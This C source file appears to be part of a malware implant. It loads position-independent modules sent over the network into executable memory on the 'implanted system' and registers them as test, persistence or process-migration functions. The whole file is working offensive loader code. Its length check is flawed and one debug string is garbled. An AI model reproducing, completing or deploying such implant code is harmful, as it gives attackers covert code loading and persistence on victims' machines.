/*
    PIC module for sending / loading additional functionality modules over the network to the implanted system.
*/

#include <stdint.h>
#include <stdbool.h>
#include "Config.h"


/*
* @brief Checks for an existing module in the structure and zero's it out / removes the
* reference if it already exists
* @param Config network context, dynamic imports, and runtime data
* @param Module start address of module to check for
* @return status of create / write operation
*/
bool cleanExistingModule(PCONFIG Config, uint8_t * Module)
{
    // if module pointer is null, no need to clean
    if (!Module)
    {
        return true;
    }
    // get module size in memory (rounded up to page size)
    MEMORY_BASIC_INFORMATION moduleMbi;
    if (!Config->Imports->VirtualQuery((LPCVOID) Module, &moduleMbi, sizeof(moduleMbi)))
    {
        DBGPRINT(Config->Imports->DbgPrint, "(AddModule) Failed to query virtual page of existing module\n");
        return false;
    }
    // zero out memory
    SecureZeroMemory((void*)Module, moduleMbi.RegionSize);
    // free virtual memory
    if (!Config->Imports->VirtualFree(Module, 0, MEM_RELEASE))
    {
        DBGPRINT(Config->Imports->DbgPrint, "(AddModule) Failed to free virtual memory of existing module\n");
        return false;
    }
    return true;
}


/*
* @brief allocates memory in the current proces for a PIC segment and adds a function pointer
* within the modules struct of the config
* @param Config network context, dynamic imports, and runtime data
* @param Message Pointer to message containing PutFile command data
* @return true on success / false of failure
*/
bool AddModule(PCONFIG Config, PMESSAGE Message)
{
    /* LoadModule Message.Value substructure:
    *   |- uint8_t          moduleNum
    *   |- uint32_t         moduleLen
    *   |- uint8_t[]        moduleData
    */

	// ensure message is large enough to read the moduleLen
	if (Message->Length < sizeof(bool) + sizeof(uint32_t))
	{
		return false;
	}
    MESSAGE_TYPE moduleNum = (MESSAGE_TYPE) *(uint8_t*) Message->Value;
    uint32_t moduleLen = *(uint32_t*)(Message->Value + sizeof(uint8_t));
	// ensure message is large enough to read the full exeData
	if (Message->Length < moduleLen - (sizeof(uint8_t) + sizeof(uint32_t)))
	{
		return false;
    }

    uint8_t* moduleData = (uint8_t*)(Message->Value + sizeof(uint8_t) + sizeof(uint32_t));
    void * modulePtr = Config->Imports->VirtualAlloc(NULL, moduleLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!modulePtr)
    {
        DBGPRINT(Config->Imports->DbgPrint, "(AddModule) Failed to Virtual Alloc Memory for Module");
        return false;
    }

    // ** there is potential for less data to be sent than stated in moduleLen, leading to memcpy of unintended heap data into virtual alloc space
    Config->Imports->memcpy_s(modulePtr, moduleLen, moduleData, moduleLen);

    if (moduleNum == TEST)
    {
        // if this module was previously added, free it before reassigning
        if (!cleanExistingModule(Config, (uint8_t *)Config->Modules->Test))
        {
            return false;
        }
        // assign new module pointer into the Modules stuct
        Config->Modules->Test = (ModuleTest)modulePtr;
    }
    else if (moduleNum == PERSIST)
    {
        if (!cleanExistingModule(Config, (uint8_t *)Config->Modules->Persist))
        {
            return false;
        }
        // assign new module pointer into the Modules stuct
        Config->Modules->Persist = (ModulePersist)modulePtr;
    }
    else if (moduleNum == MIGRATE)
    {
        if (!cleanExistingModule(Config, (uint8_t *)Config->Modules->Migrate))
        {
            return false;
        }
        Config->Modules->Migrate = (ModuleMigrate)modulePtr;
    }
    else
    {
        DBGPRINT(Config->Imports->DbgPrint, "(AGetLastErrorddModule) Provided module number: %u, is not supported.\n", (unsigned) moduleNum);
        cleanExistingModule(Config, (uint8_t *)modulePtr);
    }

    return true;
}
